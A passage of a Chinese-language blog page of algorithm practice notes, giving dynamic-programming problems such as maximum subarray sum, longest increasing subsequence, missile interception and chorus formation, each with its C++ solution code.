class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符串区间翻转">字符串区间翻转</h3><h5 id="题目描述-39">题目描述</h5><p>小诺有一个由0和1组成的字符串现在小诺有一次机会，可以选择一个任意的区间[L,R]，将该区间内的所有字符串进行翻转(即0-&gt;1,1-&gt;0)。请问小诺经过一次翻转之后字符串中最多会有多少个1？</p><h5 id="输入输出格式-37">输入输出格式</h5><h6 id="输入描述-39">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一行输入一个正整数<span class="built_in">n</span>，表示字符串长度，<span class="built_in">n</span>&lt;=<span class="number">10</span>^<span class="number">7</span>。 </span><br><span class="line">接下来一行一个输入一个<span class="number">01</span>字符串。</span><br></pre></td></tr></table></figure><h6 id="输出描述-39">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出题目要求的答案。</span><br></pre></td></tr></table></figure><p>最大连续子串可以映射到最大序列和问题，这题要找最多0的个数，把0变成1，1变成-1，那就是标准的最大连续序列和了；</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[<span class="number">10000005</span>];</span><br><span class="line"><span class="type">int</span> d[<span class="number">10000005</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">a[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">a[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i<span class="number">-1</span>]+a[i], a[i]);</span><br><span class="line">ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最大连续子序列">最大连续子序列</h3><h5 id="题目描述-40">题目描述</h5><p>给定K个整数的序列{ N1, N2, ..., NK }，其任意连续子序列可表示为{ Ni,Ni+1, ..., Nj }，其中 1 &lt;= i &lt;= j &lt;=K。最大连续子序列是所有连续子序列中元素和最大的一个，例如给定序列{ -2,11, -4, 13, -5, -2 }，其最大连续子序列为{ 11, -4, 13}，最大和为20。现在增加一个要求，即还需要输出该子序列的第一个和最后一个元素。</p><h5 id="输入输出格式-38">输入输出格式</h5><h6 id="输入描述-40">输入描述:</h6><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试输入包含若干测试用例，每个测试用例占<span class="number">2</span>行，第<span class="number">1</span>行给出正整数<span class="built_in">K</span><span class="punctuation">(</span> <span class="built_in">K</span><span class="operator">&lt;</span> <span class="number">10000</span> <span class="punctuation">)</span>，第<span class="number">2</span>行给出<span class="built_in">K</span>个整数，中间用空格分隔。当<span class="built_in">K</span>为<span class="number">0</span>时，输入结束，该用例不被处理。</span><br></pre></td></tr></table></figure><h6 id="输出描述-40">输出描述:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对每个测试用例，在<span class="number">1</span>行里输出最大和、最大连续子序列的第一个和最后一个元素，中间用空格分隔。如果最大连续子序列不唯一，则输出序号<span class="selector-tag">i</span>和j最小的那个（如输入样例的第<span class="number">2</span>、<span class="number">3</span>组）。若所有K个元素都是负数，则定义其最大和为<span class="number">0</span>，输出整个序列的首尾元素。</span><br></pre></td></tr></table></figure><p>主要是左右边界的判断，有人是只找最大子序列和的右边界，然后一直往前减减到0为止得到左边界，比较容易想到</p><p>如果要在得到最大子序列的时候得到左边界，需要满足的条件是d[i-1]小于0并且这一轮的d[i]要比现有子序列大（直接把前面算的子序列和舍弃掉）；右边界比较好找。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">10000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line">d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> ans = a[<span class="number">0</span>], l = a[<span class="number">0</span>], r = a[<span class="number">0</span>], l_ = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[i<span class="number">-1</span>]+a[i] &lt; a[i])&#123;</span><br><span class="line">d[i] = a[i];</span><br><span class="line">l_ = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">d[i] = d[i<span class="number">-1</span>] + a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans &lt; d[i])&#123;</span><br><span class="line">ans = d[i];</span><br><span class="line">r = a[i];</span><br><span class="line">l = l_;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans &lt; <span class="number">0</span>)&#123;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line">l = a[<span class="number">0</span>];</span><br><span class="line">r = a[n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, ans, l, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大子串和">最大子串和</h3><h5 id="题目描述-41">题目描述</h5><p>输入n个整数的序列，求它的最大子串和，并输出对应的数。</p><h5 id="输入输出格式-39">输入输出格式</h5><h6 id="输入描述-41">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">多组测试数据。</span><br><span class="line">第一行输入一个整数<span class="built_in">n</span>（<span class="number">0</span>&lt;<span class="built_in">n</span>&lt;=<span class="number">100</span>）。</span><br><span class="line">接下来一行输入<span class="built_in">n</span>个数用空格隔开，保证每个数的绝对值小于<span class="number">1000</span>。</span><br></pre></td></tr></table></figure><h6 id="输出描述-41">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一行输出所求子串的序列，如果有多个答案，输出靠前的答案。</span><br><span class="line">第二行输出最大子串和。</span><br></pre></td></tr></table></figure><p>我是真服了，上一题的又过不了。</p><p>但这一题规模比较小，可以爆破。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="type">int</span> a[n+<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;, d[n+<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> max = <span class="number">-1e7</span>, l=<span class="number">0</span>, r=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">d[i] = d[i<span class="number">-1</span>] + a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; i+j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[i+j] - d[i<span class="number">-1</span>] &gt; max)&#123;</span><br><span class="line">max = d[i+j] - d[i<span class="number">-1</span>];</span><br><span class="line">l = i;</span><br><span class="line">r = i+j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = l; i &lt;= r; i++)&#123;</span><br><span class="line">cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最长升序子序列">最长升序子序列</h2><p>一种n^2的做法，状态转移方程为<img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193604186.png" alt="image-20230702193604186"><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193713438.png" alt="image-20230702193713438"></p><p>还有一种基于二分和贪心的算法，为O(nlogn)</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193732252.png" alt="image-20230702193732252"></p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193722637.png" alt="image-20230702193722637"></p><h3 id="最大上升子序列和">最大上升子序列和</h3><h5 id="题目描述-42">题目描述</h5><p>一个数的序列bi，当b1 &lt; b2 &lt; ... &lt;bS的时候，我们称这个序列是上升的。对于给定的一个序列(a1, a2,...,aN)，我们可以得到一些上升的子序列(ai1, ai2, ..., aiK)，这里1 &lt;=i1 &lt; i2 &lt; ... &lt; iK &lt;= N。比如，对于序列(1, 7, 3, 5, 9, 4,8)，有它的一些上升子序列，如(1, 7), (3, 4,8)等等。这些子序列中序列和最大为18，为子序列(1, 3, 5, 9)的和.你的任务，就是对于给定的序列，求出最大上升子序列和。注意，最长的上升子序列的和不一定是最大的，比如序列(100,1, 2, 3)的最大上升子序列和为100，而最长上升子序列为(1, 2, 3)。</p><h5 id="输入输出格式-40">输入输出格式</h5><h6 id="输入描述-42">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入包含多组测试数据。</span><br><span class="line">每组测试数据由两行组成。第一行是序列的长度<span class="built_in">N</span> (<span class="number">1</span> &lt;= <span class="built_in">N</span> &lt;= <span class="number">1000</span>)。第二行给出序列中的<span class="built_in">N</span>个整数，这些整数的取值范围都在<span class="number">0</span>到<span class="number">10000</span>（可能重复）。</span><br></pre></td></tr></table></figure><h6 id="输出描述-42">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每组测试数据，输出其最大上升子序列和。</span><br></pre></td></tr></table></figure><p>注意这题是最大上升子序列和，而不是最长上升子序列，直接dp遍历了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LIS</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">d[i] = a[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i], d[j] + a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="built_in">LIS</span>(n) &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拦截导弹">拦截导弹</h3><h5 id="题目描述-43">题目描述</h5><p>某国为了防御敌国的导弹袭击，开发出一种导弹拦截系统。但是这种导弹拦截系统有一个缺陷：虽然它的第一发炮弹能够到达任意的高度，但是以后每一发炮弹都不能高于前一发的高度。某天，雷达捕捉到敌国的导弹来袭，并观测到导弹依次飞来的高度，请计算这套系统最多能拦截多少导弹。拦截来袭导弹时，必须按来袭导弹袭击的时间顺序，不允许先拦截后面的导弹，再拦截前面的导弹。</p><h5 id="输入输出格式-41">输入输出格式</h5><h6 id="输入描述-43">输入描述:</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">每组输入有两行，</span><br><span class="line">第一行，输入雷达捕捉到的敌国导弹的数量k（k&lt;<span class="operator">=</span><span class="number">25</span>），</span><br><span class="line">第二行，输入k个正整数，表示k枚导弹的高度，按来袭导弹的袭击时间顺序给出，以空格分隔。</span><br></pre></td></tr></table></figure><h6 id="输出描述-43">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每组输出只有一行，包含一个整数，表示最多能拦截多少枚导弹。</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">30</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LIS</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">d[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt;= a[i])&#123;</span><br><span class="line">d[i] = <span class="built_in">max</span>(d[i], d[j] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="built_in">LIS</span>(n) &lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合唱队形">合唱队形</h3><h5 id="题目描述-44">题目描述</h5><p>N位同学站成一排，音乐老师要请其中的(N-K)位同学出列，使得剩下的K位同学不交换位置就能排成合唱队形。合唱队形是指这样的一种队形：设K位同学从左到右依次编号为1, 2, …,K，他们的身高分别为T1, T2, …, TK， 则他们的身高满足T1 &lt; T2 &lt; …&lt; Ti , Ti &gt; Ti+1 &gt; … &gt; TK (1 &lt;= i &lt;= K)。你的任务是，已知所有N位同学的身高，计算最少需要几位同学出列，可以使得剩下的同学排成合唱队形。</p><h5 id="输入输出格式-42">输入输出格式</h5><h6 id="输入描述-44">输入描述:</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入的第一行是一个整数N（<span class="number">2</span> &lt;<span class="operator">=</span> N &lt;<span class="operator">=</span> <span class="number">100</span>），表示同学的总数。</span><br><span class="line">第一行有n个整数，用空格分隔，第i个整数Ti（<span class="number">130</span> &lt;<span class="operator">=</span> Ti &lt;<span class="operator">=</span> <span class="number">230</span>）是第i位同学的身高（厘米）。</span><br></pre></td></tr></table></figure><h6 id="输出描述-44">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可能包括多组测试数据，对于每组数据，</span><br><span class="line">输出包括一行，这一行只包含一个整数，就是最少需要几位同学出列。</span><br></pre></td></tr></table></figure><p>正着排一遍，再倒着排一遍，找最大的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d1[maxn];</span><br><span class="line"><span class="type">int</span> d2[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="built_in">memset</span>(d1, <span class="number">0</span>, <span class="built_in">sizeof</span>(d1));</span><br><span class="line"><span class="built_in">memset</span>(d2, <span class="number">0</span>, <span class="built_in">sizeof</span>(d2));</span><br><span class="line"><span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">d1[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">d1[i] = <span class="built_in">max</span>(d1[i], d1[j]+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = n; i &gt;= <span class="number">1</span>; i--)&#123;</span><br><span class="line">d2[i] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = n; j &gt; i; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &lt; a[i])&#123;</span><br><span class="line">d2[i] = <span class="built_in">max</span>(d2[i], d2[j]+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="type">int</span> tmp = d1[i] + d2[i];</span><br><span class="line">ans = <span class="built_in">max</span>(ans, tmp);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; n-ans+<span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最长递减子序列">最长递减子序列</h3><h5 id="题目描述-45">题目描述</h5><p>输入数字n，和n个整数，输出该数字串中的最长递减序列</p><h5 id="输入输出格式-43">输入输出格式</h5><h6 id="输入描述-45">输入描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">见样例</span><br></pre></td></tr></table></figure><h6 id="输出描述-45">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span 